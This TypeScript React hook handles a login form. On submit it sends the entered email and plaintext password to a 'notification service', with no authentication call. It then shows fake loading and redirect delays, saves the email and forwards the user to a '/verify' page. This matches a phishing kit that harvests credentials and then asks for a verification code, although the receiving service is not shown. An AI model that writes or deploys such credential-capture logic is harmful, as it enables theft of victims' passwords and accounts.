import { useState, FormEvent } from 'react';
import { useNavigate } from 'react-router-dom';
import { LoginFormData } from '../types';
import { validateLoginForm } from '../utils/validation';
import { AUTH_MESSAGES } from '../constants';
import { notifyLoginAttempt } from '../services/notificationService';
import { storage } from '../utils/storage';
import { DELAYS } from '../config/delays';

export function useLoginForm() {
  const [formData, setFormData] = useState<LoginFormData>({
    email: '',
    password: ''
  });
  const [errors, setErrors] = useState<string[]>([]);
  const [isLoading, setIsLoading] = useState(false);
  const [isRedirecting, setIsRedirecting] = useState(false);
  const navigate = useNavigate();

  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    const validationErrors = validateLoginForm(formData);
    
    if (validationErrors.length === 0) {
      setIsLoading(true);
      try {
        await notifyLoginAttempt(formData);
        await new Promise(resolve => setTimeout(resolve, DELAYS.LOADING));
        
        storage.set('email', formData.email);
        setIsLoading(false);
        setIsRedirecting(true);
        
        await new Promise(resolve => setTimeout(resolve, DELAYS.REDIRECT));
        navigate('/verify');
      } catch (error) {
        setErrors([AUTH_MESSAGES.ERRORS.GENERIC]);
        setIsLoading(false);
      }
    } else {
      setErrors(validationErrors);
    }
  };

  const handleChange = (field: keyof LoginFormData) => (
    e: React.ChangeEvent<HTMLInputElement>
  ) => {
    setFormData(prev => ({
      ...prev,
      [field]: e.target.value
    }));
    setErrors([]);
  };

  return {
    formData,
    errors,
    isLoading,
    isRedirecting,
    handleChange,
    handleSubmit,
  };
}